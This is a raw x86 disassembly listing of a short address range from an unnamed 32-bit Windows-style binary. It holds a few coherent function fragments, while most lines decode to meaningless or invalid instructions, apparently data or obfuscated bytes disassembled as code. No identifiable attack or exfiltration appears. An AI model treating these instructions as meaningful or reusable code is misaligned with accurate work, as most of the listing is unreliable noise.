  40e46b:	ins    DWORD PTR es:[edi],dx
  40e46c:	icebp  
  40e46d:	jle    0x40e404
  40e46f:	fcomi  st,st(7)
  40e471:	inc    esp
  40e472:	xchg   edx,eax
  40e473:	ror    bl,cl
  40e475:	mov    ss,WORD PTR [esi+eiz*1-0x4165dfe]
  40e47c:	jae    0x40e4f5
  40e47e:	lds    esi,FWORD PTR [eax+0x4b]
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebp,DWORD PTR [edx+0x2968c08]
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e511
  40e4c4:	pop    es
  40e4c5:	jns    0x40e472
  40e4c7:	lahf   
  40e4c8:	clc    
  40e4c9:	mov    bl,0x84
  40e4cb:	lahf   
  40e4cc:	mov    al,ds:0xc3958f99
  40e4d1:	xor    eax,0xc6afc541
  40e4d6:	pop    es
  40e4d7:	sub    al,0x82
  40e4d9:	xor    DWORD PTR [edx+0x77],ebx
  40e4dc:	fimul  DWORD PTR [ecx+0x7ee67c12]
  40e4e2:	popa   
  40e4e3:	jle    0x40e4ed
  40e4e5:	lock sbb dh,BYTE PTR [ecx-0x77]
  40e4e9:	outs   dx,DWORD PTR ds:[esi]
  40e4ea:	aam    0x6
  40e4ec:	mov    ds:0xdc739329,eax
  40e4f1:	or     esp,eax
  40e4f3:	lock push 0x7ac2b143
  40e4f9:	sahf   
  40e4fa:	lea    eax,[edx]
  40e4fc:	sbb    DWORD PTR [ebp-0x27c6c825],0xe3646f68
  40e506:	dec    edi
  40e507:	xor    ah,dl
  40e509:	adc    BYTE PTR [eax-0x79],0x32
  40e50d:	mov    eax,0x134e79f8
  40e512:	mov    cl,0x23
  40e514:	dec    edi
  40e515:	pop    ebx
  40e516:	popa   
  40e517:	fwait
  40e518:	jmp    0x9627:0x83aa826d
  40e51f:	pop    ecx
  40e520:	out    0xbd,al
  40e522:	stos   BYTE PTR es:[edi],al
  40e523:	pop    es
  40e524:	inc    esp
  40e525:	fistp  WORD PTR [esi+eiz*4-0x49]
  40e529:	or     BYTE PTR [ebx],bh
  40e52b:	inc    edx
  40e52c:	(bad)  
  40e52d:	mov    ebx,0x2a6df192
  40e532:	sub    al,0xc
  40e534:	std    
  40e535:	jo     0x40e544
  40e537:	sbb    ecx,ebp
  40e539:	and    eax,0x6645aa48
  40e53e:	sub    cl,BYTE PTR [ecx+0x41]
  40e541:	enter  0x6551,0x2a
  40e545:	mov    eax,0x999371ee
  40e54a:	dec    esi
  40e54b:	out    0x6d,eax
  40e54d:	call   0x1a32c704
  40e552:	xor    cl,ah
  40e554:	xchg   edi,eax
  40e555:	cmp    eax,0x83a84887
  40e55a:	inc    esi
  40e55b:	stos   DWORD PTR es:[edi],eax
  40e55c:	push   ecx
  40e55d:	call   0x44c4:0x8d4a0c75
  40e564:	pop    es
  40e565:	xor    eax,0x3ffac9ec
  40e56a:	sahf   
  40e56b:	repz shr BYTE PTR [ebx+0x667d6cc3],0x31
  40e573:	pop    ds
  40e574:	pushf  
  40e575:	sub    eax,0xa53bce8b
  40e57a:	mov    esp,0x30530a54
  40e57f:	add    al,0xee
  40e581:	xchg   BYTE PTR [edx-0x13],al
  40e584:	pop    eax
  40e585:	jnp    0x40e5a8
  40e587:	je     0x40e56f
  40e589:	jle    0x40e601
  40e58b:	hlt    
  40e58c:	and    DWORD PTR [eax+eax*8+0x77ca8f29],0x2d
  40e594:	(bad)  
  40e596:	in     al,dx
  40e597:	outs   dx,BYTE PTR ds:[esi]
  40e598:	jl     0x40e613
  40e59a:	sub    eax,0x8f5f98d2
  40e59f:	pusha  
  40e5a0:	mov    ch,0xe3
  40e5a2:	add    ah,BYTE PTR [edi-0x7f]
  40e5a5:	mov    BYTE PTR [edx],ch
  40e5a7:	jb     0x40e5d5
  40e5a9:	cdq    
  40e5aa:	fbstp  TBYTE PTR [edi+eiz*8+0x68]
  40e5ae:	test   DWORD PTR [esi+0x19],0xa78650e3
  40e5b5:	aaa    
  40e5b6:	popa   
  40e5b7:	push   0x77c552ec
  40e5bc:	dec    ebp
  40e5bd:	or     DWORD PTR [ebp+0x103acbfc],ebp
  40e5c3:	pop    esp
  40e5c4:	sbb    eax,0x3098484e
  40e5c9:	loopne 0x40e559
  40e5cb:	cli    
  40e5cc:	aaa    
  40e5cd:	aas    
  40e5ce:	jg     0x40e635
  40e5d0:	out    dx,al
  40e5d1:	pop    edi
  40e5d2:	add    al,BYTE PTR [edi+esi*4-0x1b1c8b62]
  40e5d9:	jmp    0x40e5d6
  40e5db:	mov    esi,0x2d076d72
  40e5e0:	mov    al,ds:0x93d32591
  40e5e5:	jne    0x40e5ab
  40e5e7:	stos   DWORD PTR es:[edi],eax
  40e5e8:	jp     0x40e5e0
  40e5ea:	jb     0x40e662
  40e5ec:	mov    dh,0x47
  40e5ee:	or     BYTE PTR [edi],bh
  40e5f0:	fs scas al,BYTE PTR es:[edi]
  40e5f2:	rcr    ebx,cl
  40e5f4:	std    
  40e5f5:	jns    0x40e5a1
  40e5f7:	cmp    eax,0x17ba6b97
  40e5fc:	cdq    
  40e5fd:	inc    edx
  40e5fe:	mov    dl,0xc3
  40e600:	xor    cl,0x5e
  40e603:	aam    0xf5
  40e605:	cld    
  40e606:	cld    
  40e607:	stc    
  40e608:	or     dl,BYTE PTR [ebx-0x5d26ea58]
  40e60e:	xor    BYTE PTR [esi+0x18],dh
  40e611:	aaa    
  40e612:	stc    
  40e613:	inc    ebx
  40e614:	inc    ebp
  40e615:	or     al,0x91
  40e617:	pop    esp
  40e618:	pop    ecx
  40e619:	jbe    0x40e602
  40e61b:	cmp    al,0xb3
  40e61d:	jmp    0xd4cb08e2
  40e622:	mov    al,0xd0
  40e624:	jg     0x40e629
  40e626:	neg    dh
  40e628:	ja     0x40e5c9
  40e62a:	sar    BYTE PTR [eax-0x3b],1
  40e62d:	loope  0x40e622
  40e62f:	pop    ecx
  40e630:	jo     0x40e5c1
  40e632:	dec    ebp
  40e633:	hlt    
  40e634:	sbb    dh,BYTE PTR [esi-0x3d]
  40e637:	sub    ch,BYTE PTR [edi+eax*1-0x6d]
  40e63b:	sbb    bh,BYTE PTR [ebx]
  40e63d:	lods   al,BYTE PTR ds:[esi]
  40e63e:	in     eax,dx
  40e63f:	dec    ecx
  40e640:	mov    dl,0xed
  40e642:	outs   dx,DWORD PTR ds:[esi]
  40e643:	call   0xc4:0x597de562
  40e64a:	push   eax
  40e64b:	sub    esi,esp
  40e64d:	mov    al,0xa0
  40e64f:	xchg   edi,eax
  40e650:	leave  
  40e651:	daa    
  40e652:	out    dx,eax
  40e653:	xor    ecx,DWORD PTR cs:[eax-0x52]
  40e657:	popf   
  40e658:	cmp    ebx,DWORD PTR [ecx-0x43]
  40e65b:	outs   dx,DWORD PTR ds:[esi]
  40e65c:	dec    ebp
  40e65d:	add    edx,edi
  40e65f:	fnclex 
  40e661:	(bad)  
  40e662:	out    0x65,al
  40e664:	fistp  QWORD PTR [edi-0x5d]
  40e667:	call   FWORD PTR [esi]
  40e669:	mov    eax,0x22de82e
  40e66e:	push   ecx
  40e66f:	mov    ebp,0xbddd1fd2
  40e674:	push   0xe2c88b1c
  40e679:	call   DWORD PTR [edx-0x19f89e6]
  40e67f:	mov    eax,ds:0xfd884e24
  40e684:	and    al,0x8
  40e686:	(bad)  
  40e687:	push   ecx
  40e688:	mov    al,0x43
  40e68a:	xchg   ecx,eax
  40e68b:	in     eax,0x6c
  40e68d:	iret   
  40e68e:	arpl   WORD PTR [ecx],bp
  40e690:	inc    ebp
  40e691:	and    bh,cl
  40e693:	jmp    FWORD PTR [esi-0x49ca4b54]
  40e699:	sti    
  40e69a:	adc    DWORD PTR [ebx-0x18815e5b],ecx
  40e6a0:	pop    ecx
  40e6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a2:	xor    bl,0x76
  40e6a5:	fdivp  st(6),st
  40e6a7:	jae    0x40e64f
  40e6a9:	out    0x43,al
  40e6ab:	jnp    0x40e6da
  40e6ad:	popa   
  40e6ae:	mov    BYTE PTR [ebx+0x50296847],dh
  40e6b4:	fst    QWORD PTR [edx-0x16]
  40e6b7:	jge    0x40e68d
  40e6b9:	in     al,dx
  40e6ba:	cmp    DWORD PTR [ebx+0x4f823824],ecx
  40e6c0:	and    DWORD PTR [ecx+0x62b20e6e],0x12f5f2a5
  40e6ca:	outs   dx,BYTE PTR ds:[esi]
  40e6cb:	lods   eax,DWORD PTR ds:[esi]
  40e6cc:	or     BYTE PTR [edx-0x3e],dh
  40e6cf:	inc    ecx
  40e6d0:	push   ebx
  40e6d1:	(bad)  
  40e6d3:	xchg   ecx,eax
  40e6d4:	dec    edx
  40e6d5:	enter  0x3ff1,0x24
  40e6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6da:	jnp    0x40e6b0
  40e6dc:	push   eax
  40e6dd:	icebp  
  40e6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6df:	mov    bl,BYTE PTR [ebp+0x46]
  40e6e2:	ret    0x4ba3
  40e6e5:	test   ah,dh
  40e6e7:	mov    WORD PTR [ebx],ss
  40e6e9:	dec    esi
  40e6ea:	mov    cl,0x95
  40e6ec:	mov    eax,0x2c0ce981
  40e6f1:	out    dx,eax
  40e6f2:	pminsw mm0,QWORD PTR [edx]
  40e6f5:	sub    ebx,DWORD PTR [edi]
  40e6f7:	int3   
  40e6f8:	clc    
  40e6f9:	mov    esi,DWORD PTR [ebx+0x33d149f5]
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	lods   eax,DWORD PTR gs:[esi]
  40e734:	(bad)  [esi+0x7878bb3f]
  40e73a:	xor    eax,0x8078787e
  40e73f:	lock mov edx,0xb6148c7e
  40e745:	lahf   
  40e746:	dec    edi
  40e747:	and    al,0xb3
  40e749:	mov    ss,WORD PTR ds:0xf249bc3e
  40e74f:	mov    dh,0xb1
  40e751:	mov    ecx,0xdc651ca6
  40e756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e757:	rol    DWORD PTR [ebp+ecx*2-0x1c],0x8e
  40e75c:	mov    ecx,esi
  40e75e:	shr    BYTE PTR [ebx+0x33],0x92
  40e762:	xor    eax,0x2b68f1b2
  40e767:	fcom   QWORD PTR [esp+ecx*8-0x1f969915]
  40e76e:	in     al,0x7b
  40e770:	or     al,0x61
  40e772:	fadd   st,st(7)
  40e774:	ret    
  40e775:	push   ebp
  40e776:	shl    edi,cl
  40e778:	push   ebx
  40e779:	je     0x40e7c5
  40e77b:	pop    es
  40e77c:	ret    0x1ad6
  40e77f:	out    dx,al
  40e780:	jle    0x40e7db
  40e782:	cmc    
  40e783:	aam    0x60
  40e785:	inc    ebp
  40e786:	in     eax,dx
  40e787:	fisub  DWORD PTR [eax-0x5dae2bde]
  40e78d:	out    dx,eax
  40e78e:	addr16 xor bh,ah
  40e791:	add    DWORD PTR [ecx],ebp
  40e793:	pop    edi
  40e794:	jbe    0x40e729
  40e796:	and    DWORD PTR ds:0x95d32696,ebx
  40e79c:	int3   
  40e79d:	popa   
  40e79e:	call   0xbd8731c8
  40e7a3:	dec    esp
  40e7a4:	jb     0x40e7a2
  40e7a6:	in     al,0x36
  40e7a8:	sar    DWORD PTR [esi-0x5d1e2fee],cl
  40e7ae:	retf   0xc0ed
  40e7b1:	retf   0x9c57
  40e7b4:	rol    ch,1
  40e7b6:	push   esp
  40e7b7:	mov    dh,0x8a
  40e7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ba:	push   eax
  40e7bb:	jmp    0x50bb:0x7f4c2c3c
  40e7c2:	lock xlat BYTE PTR ds:[ebx]
  40e7c4:	dec    esi
  40e7c5:	push   cs
  40e7c6:	sti    
  40e7c7:	xor    DWORD PTR [edx],eax
  40e7c9:	fldenv [edi-0x25]
  40e7cc:	(bad)  
  40e7ce:	cld    
  40e7cf:	loopne 0x40e7e9
  40e7d1:	cld    
  40e7d2:	mov    cr2,ebx
  40e7d5:	add    BYTE PTR [ebx-0x3bdaf14f],dh
  40e7db:	(bad)  
  40e7dd:	das    
  40e7de:	neg    BYTE PTR [ecx]
  40e7e0:	push   ds
  40e7e1:	sahf   
  40e7e2:	pop    ebp
  40e7e3:	pop    es
  40e7e4:	jmp    0x7e17:0xb44e996d
  40e7eb:	mov    ah,0x92
  40e7ed:	dec    ecx
  40e7ee:	mov    esi,0xae993705
  40e7f3:	cmp    bl,BYTE PTR [esi+0x7e]
  40e7f6:	add    al,BYTE PTR ds:0x5a84a484
  40e7fc:	test   al,0x77
  40e7fe:	xor    ch,BYTE PTR [ecx-0x2ceded5]
  40e804:	loope  0x40e7a6
  40e806:	xor    dh,BYTE PTR [eax+0x5ad7cc2b]
  40e80c:	adc    edx,esp
  40e80e:	pop    ds
  40e80f:	js     0x40e838
  40e811:	out    0x97,al
  40e813:	(bad)  
  40e814:	mov    ch,0xb9
  40e816:	loope  0x40e7c4
  40e818:	jb     0x40e7e9
  40e81a:	mov    al,ds:0x23bd94a9
  40e81f:	jp     0x40e89a
  40e821:	enter  0xc02f,0x11
  40e825:	inc    esi
  40e826:	sti    
  40e827:	test   esp,esp
  40e829:	xchg   ebp,eax
  40e82a:	inc    edi
  40e82b:	jno    0x40e80f
  40e82d:	stos   DWORD PTR es:[edi],eax
  40e82e:	lds    edi,FWORD PTR [ebx]
  40e830:	arpl   WORD PTR [eax+0x6d],si
  40e833:	sbb    al,0x19
  40e835:	xchg   DWORD PTR [eax+0x44],esi
  40e838:	or     eax,0xcbf3b89d
  40e83d:	lods   eax,DWORD PTR ds:[esi]
  40e83e:	and    eax,esi
  40e840:	mov    edx,0xf63ad61a
  40e845:	and    eax,0x56edbf88
  40e84a:	xor    eax,DWORD PTR fs:[eax+0xf]
  40e84e:	gs call 0x2062:0x4a93eddc
  40e856:	mov    ch,BYTE PTR [ebx-0x3f]
  40e859:	cdq    
  40e85a:	popa   
  40e85b:	nop
  40e85c:	and    ecx,DWORD PTR [ebp+0x1a]
  40e85f:	push   eax
  40e860:	imul   ecx,DWORD PTR [ebx],0xfffffffd
  40e863:	jg     0x40e822
  40e865:	aad    0x9b
  40e867:	jb     0x40e828
  40e869:	xor    bh,dh
  40e86b:	and    eax,0x39c5cf48
  40e870:	mov    ds:0x6bf1fc35,al
  40e875:	stc    
  40e876:	cmp    dh,BYTE PTR [ecx]
  40e878:	add    BYTE PTR [ebx+ebx*1],cl
  40e87b:	lds    eax,FWORD PTR [esi]
  40e87d:	jo     0x40e857
  40e87f:	jne    0x40e8f0
  40e881:	jne    0x40e88d
  40e883:	fldcw  WORD PTR [ebx-0x73]
  40e886:	cmp    DWORD PTR [ebp-0x29],edx
  40e889:	pop    esi
  40e88a:	popf   
  40e88b:	or     DWORD PTR [edx+0x79a961da],ebx
  40e891:	aas    
  40e892:	xor    al,0x48
  40e894:	add    dh,BYTE PTR ds:0x179841a3
  40e89a:	hlt    
  40e89b:	cmp    edi,esp
  40e89d:	cmp    dl,BYTE PTR ds:0x12fd972
  40e8a3:	mov    al,ds:0x5d32b7ab
  40e8a8:	adc    edx,eax
  40e8aa:	cld    
  40e8ab:	or     eax,0xe2e8242e
  40e8b0:	pop    ebx
  40e8b1:	pop    edi
  40e8b2:	bound  edi,QWORD PTR [ebx+0x3a91c22a]
  40e8b8:	call   0xf27b:0x94155653
  40e8bf:	int3   
  40e8c0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e8c2:	fdiv   QWORD PTR ds:0xf0013128
  40e8c8:	adc    eax,0xc2c2bac6
  40e8ce:	cmp    esp,DWORD PTR [edx+0x27]
  40e8d1:	push   esp
  40e8d2:	push   edx
  40e8d3:	and    ecx,edx
  40e8d5:	dec    esi
  40e8d6:	inc    esp
  40e8d7:	stos   DWORD PTR es:[edi],eax
  40e8d8:	pop    ebp
  40e8d9:	or     esi,esi
  40e8db:	sbb    BYTE PTR [esi-0x14],dh
  40e8de:	cmp    ebp,DWORD PTR [ebx+0x52]
  40e8e1:	xor    esp,DWORD PTR [esi+ebx*4]
  40e8e4:	shr    DWORD PTR [ebx],0xc6
  40e8e7:	hlt    
  40e8e8:	retf   
  40e8e9:	leave  
  40e8ea:	daa    
  40e8eb:	shrd   eax,eax,cl
  40e8ee:	push   esp
  40e8ef:	ja     0x40e942
  40e8f1:	arpl   sp,ax
  40e8f3:	mov    edx,0x9e101650
  40e8f8:	jp     0x40e942
  40e8fa:	and    bl,al
  40e8fc:	shr    BYTE PTR [edx+0x1a],cl
  40e8ff:	test   BYTE PTR [edx-0x4f],cl
  40e902:	sbb    al,0x42
  40e904:	stc    
  40e905:	xchg   DWORD PTR [eax],eax
  40e907:	iret   
  40e908:	inc    esp
  40e909:	push   eax
  40e90a:	clc    
  40e90b:	jne    0x40e8a4
  40e90d:	xor    ch,0x86
  40e910:	pop    ds
  40e911:	sbb    al,0x3c
  40e913:	sub    dh,BYTE PTR [ebx]
  40e915:	xlat   BYTE PTR ds:[ebx]
  40e916:	(bad)  
  40e917:	xor    al,0x69
  40e919:	cmc    
  40e91a:	push   eax
  40e91b:	sub    ebp,esi
  40e91d:	jne    0x40e8e0
  40e91f:	rol    DWORD PTR [esi],0x8b
  40e922:	inc    esp
  40e923:	enter  0xf61e,0xe6
  40e927:	mov    al,0xbd
  40e929:	(bad)  
  40e92a:	xchg   esi,eax
  40e92b:	add    DWORD PTR [edx],ebx
  40e92d:	mov    eax,0x5483777b
  40e932:	sub    eax,0xaff80f77
  40e937:	jno    0x40e958
  40e939:	or     DWORD PTR [ebx+0xe],0x30
  40e93d:	pushf  
  40e93e:	pop    ecx
  40e93f:	xchg   ebx,eax
  40e940:	pop    ecx
  40e941:	or     BYTE PTR [eax+ebx*4+0x7f60d853],ah
  40e948:	inc    ecx
  40e949:	jmp    0x40e8da
  40e94b:	scas   eax,DWORD PTR es:[edi]
  40e94c:	and    al,0x10
  40e94e:	vphsubdq xmm12,xmm3
  40e953:	and    bh,BYTE PTR [ebp-0x49fca358]
  40e959:	pop    ebp
  40e95a:	push   edi
  40e95b:	repz aam 0x7e
  40e95e:	or     bh,BYTE PTR [edx-0x78ee2906]
  40e964:	popf   
  40e965:	add    al,0x21
  40e967:	push   ecx
  40e968:	mov    ebx,0x75cd4a0f
  40e96d:	or     al,0x54
  40e96f:	jno    0x40e956
  40e971:	sbb    BYTE PTR fs:[ecx],bl
  40e974:	jbe    0x40e9d5
  40e976:	pusha  
  40e977:	xor    edx,0x330c458b
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	adc    al,0x74
  40ea24:	scas   eax,DWORD PTR es:[edi]
  40ea25:	jle    0x40ea1b
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	fdivr  QWORD PTR [esi-0x29bc711a]
  40ea34:	adc    ah,BYTE PTR [esi+0x3b]
  40ea37:	call   DWORD PTR [ebx]
  40ea39:	mov    dl,0x89
  40ea3b:	xchg   ebx,eax
  40ea3d:	sub    BYTE PTR ds:0x2f441390,bh
  40ea43:	xchg   BYTE PTR [eax+ecx*4-0x59],bl
  40ea47:	in     al,0x4f
  40ea49:	adc    edx,DWORD PTR [edi-0x6a]
  40ea4c:	imul   edi,DWORD PTR [ebp-0x4b],0xccc07bd1
  40ea53:	das    
  40ea54:	pop    ebx
  40ea55:	xor    BYTE PTR [edi],cl
  40ea57:	scas   eax,DWORD PTR es:[edi]
  40ea58:	sbb    BYTE PTR [edi+0xc],ch
  40ea5b:	jmp    0x40ea56
  40ea5d:	into   
  40ea5e:	xchg   edx,eax
  40ea5f:	bound  edi,QWORD PTR [ecx]
  40ea61:	iret   
  40ea62:	ds (bad) 
  40ea64:	sar    DWORD PTR [eax-0x5a],1
  40ea67:	pusha  
  40ea68:	retf   0xe2a8
  40ea6b:	lahf   
  40ea6c:	addr16 mov ds:0x55c5,al
  40ea70:	jp     0x40ea8d
  40ea72:	loopne 0x40ea0e
  40ea74:	repnz and cl,0xf6
  40ea78:	xchg   ebp,eax
  40ea79:	lds    eax,FWORD PTR [eax]
  40ea7b:	inc    edx
  40ea7c:	lods   al,BYTE PTR ds:[esi]
  40ea7d:	xchg   edx,eax
  40ea7e:	stc    
  40ea7f:	xchg   ecx,eax
  40ea80:	dec    ecx
  40ea81:	iret   
  40ea82:	adc    ebx,ecx
  40ea84:	lds    ebp,FWORD PTR [edi]
  40ea86:	mov    esi,0x3e9245f1
  40ea8b:	jp     0x40eac4
  40ea8d:	cli    
  40ea8e:	sti    
  40ea8f:	lods   eax,DWORD PTR ds:[esi]
  40ea90:	repz out dx,eax
  40ea92:	push   ebp
  40ea93:	adc    eax,0x7ce2a5
  40ea98:	and    BYTE PTR [edi],dh
  40ea9a:	push   ebx
  40ea9b:	lock inc ebp
  40ea9d:	ins    DWORD PTR es:[edi],dx
  40ea9e:	adc    ebx,DWORD PTR [esi]
  40eaa0:	sbb    DWORD PTR [edx],0x5d2a9169
  40eaa6:	addr16 je 0x40ea9f
  40eaa9:	adc    dh,cl
  40eaab:	clc    
  40eaac:	xchg   edi,eax
  40eaad:	xrelease xchg BYTE PTR [ecx-0x8d67c5e],ah
  40eab4:	cs retf 0x65ad
  40eab8:	clc    
  40eab9:	cwde   
  40eaba:	jo     0x40ea4a
  40eabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eabe:	cdq    
  40eabf:	pop    esp
  40eac0:	xor    cl,bh
  40eac2:	ret    0xef7b
  40eac5:	sbb    BYTE PTR [ebx+edi*8+0x62],ah
  40eac9:	test   eax,0x52ba0209
  40eace:	and    ch,al
  40ead0:	inc    esp
  40ead1:	ror    BYTE PTR [ecx+0x1b71102a],0x8d
  40ead8:	iret   
  40ead9:	sbb    edx,DWORD PTR [eax+0x329acaf5]
  40eadf:	jb     0x40eabd
  40eae1:	and    edx,DWORD PTR [edx+0x319ac96f]
  40eae7:	mov    eax,ds:0x9d4b96bb
  40eaec:	sti    
  40eaed:	and    al,0x4c
  40eaef:	fistp  QWORD PTR [edx+esi*4]
  40eaf2:	outs   dx,BYTE PTR ds:[esi]
  40eaf3:	cmp    eax,0x23d543d3
  40eaf8:	aam    0xce
  40eafa:	sub    al,0xf0
  40eafc:	xchg   ebx,eax
  40eafd:	pop    ebp
  40eafe:	jmp    0xd4f5c3b9
  40eb03:	imul   eax,DWORD PTR [edi+0x22180c80],0xe81dc0df
  40eb0d:	pop    ebx
  40eb0e:	arpl   WORD PTR [ebx-0xe9e0fe],sp
  40eb14:	mov    ds:0x71bfdebc,al
  40eb19:	das    
  40eb1a:	imul   esi,DWORD PTR [edx-0x4d98193a],0x6b
  40eb21:	sbb    eax,0xcd867764
  40eb26:	aam    0xf8
  40eb28:	fisubr DWORD PTR [ebx-0x4860e274]
  40eb2e:	mov    ah,0x4b
  40eb30:	pop    eax
  40eb31:	mov    ecx,0x453e7a67
  40eb36:	addr16 pop ebp
  40eb38:	loop   0x40eb12
  40eb3a:	mov    ecx,0x6aa97729
  40eb3f:	cmp    al,BYTE PTR [esi-0x71bbefdb]
  40eb45:	or     DWORD PTR [ebx],ecx
  40eb47:	push   ebp
  40eb48:	rol    BYTE PTR [eax],cl
  40eb4a:	fsub   QWORD PTR [edx+0x68]
  40eb4d:	in     eax,0xb2
  40eb4f:	sbb    bl,cl
  40eb51:	jno    0x40eb80
  40eb53:	jmp    DWORD PTR [ebx-0x77]
  40eb56:	and    al,0xe
  40eb58:	mov    ah,BYTE PTR [ebp*1-0x1a91b1b0]
  40eb5f:	not    BYTE PTR [ebp-0x6f]
  40eb62:	jmp    0x5063:0x51b47036
  40eb69:	test   eax,0x3d218ec9
  40eb6e:	adc    eax,0xc5d81525
  40eb73:	mov    ebx,0x284c0f5b
  40eb78:	popa   
  40eb79:	(bad)  
  40eb7a:	mov    edx,0x8b926617
  40eb7f:	push   edx
  40eb80:	dec    esp
  40eb81:	jmp    0x257:0x61ab4d6e
  40eb88:	mov    esi,0xaa2d09f8
  40eb8d:	ss jge 0x40eb66
  40eb90:	jmp    0x4d18cd4c
  40eb95:	ficom  DWORD PTR [ecx-0x57]
  40eb98:	js     0x40eb95
  40eb9a:	fst    DWORD PTR [esi]
  40eb9c:	bound  edi,QWORD PTR [edi+0x23a16c1a]
  40eba2:	imul   eax,DWORD PTR [ecx+0x5e661c95],0xffffffba
  40eba9:	mov    ds:0x2274654b,eax
  40ebae:	(bad)  
  40ebaf:	xlat   BYTE PTR ds:[ebx]
  40ebb0:	mov    bl,0x53
  40ebb2:	aas    
  40ebb3:	jle    0x40ebec
  40ebb5:	xchg   esp,eax
  40ebb6:	adc    BYTE PTR [ebp+ebp*1-0x1e],ch
  40ebba:	dec    edi
  40ebbb:	push   cs
  40ebbc:	aam    0xcc
  40ebbe:	sbb    eax,0x553b55a3
  40ebc3:	scas   al,BYTE PTR es:[edi]
  40ebc4:	xlat   BYTE PTR ds:[ebx]
  40ebc5:	xchg   dl,dh
  40ebc7:	jg     0x40eb4f
  40ebc9:	mov    edx,0x8c9fda20
  40ebce:	xor    dl,BYTE PTR [esi]
  40ebd0:	test   BYTE PTR [eax-0x12],ch
  40ebd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebd4:	xor    ebx,DWORD PTR [esp+edx*2-0x7fcd5a4f]
  40ebdb:	mov    ds:0x4afccd6e,al
  40ebe0:	lock ss std 
  40ebe3:	adc    dh,cl
  40ebe5:	sbb    ebx,DWORD PTR [eax]
  40ebe7:	rcl    BYTE PTR [esi+ebp*8+0xd],cl
  40ebeb:	fdivp  st(3),st
  40ebed:	adc    esp,DWORD PTR [esi-0x553ed457]
  40ebf3:	sahf   
  40ebf4:	cmc    
  40ebf5:	ja     0x40ec1b
  40ebf7:	jae    0x40ec26
  40ebf9:	sbb    BYTE PTR [ebp-0x72],ah
  40ebfc:	and    DWORD PTR [edx+edi*1-0x3bde1b44],esi
  40ec03:	push   esi
  40ec04:	mov    ch,0x5
  40ec06:	dec    ebx
  40ec07:	jne    0x40ec62
  40ec09:	sbb    esi,eax
  40ec0b:	sub    al,0x30
  40ec0d:	pop    ebx
  40ec0e:	ret    0x2830
  40ec11:	sbb    DWORD PTR [edi],edi
  40ec13:	pop    ds
  40ec14:	pop    esp
  40ec15:	clc    
  40ec16:	call   0x807ddf0e
  40ec1b:	fdivr  DWORD PTR [edi]
  40ec1d:	sar    BYTE PTR [esi+0x6a1c71f1],1
  40ec23:	push   0xffffffd3
  40ec25:	pop    ebx
  40ec26:	leave  
  40ec27:	retf   
  40ec28:	cli    
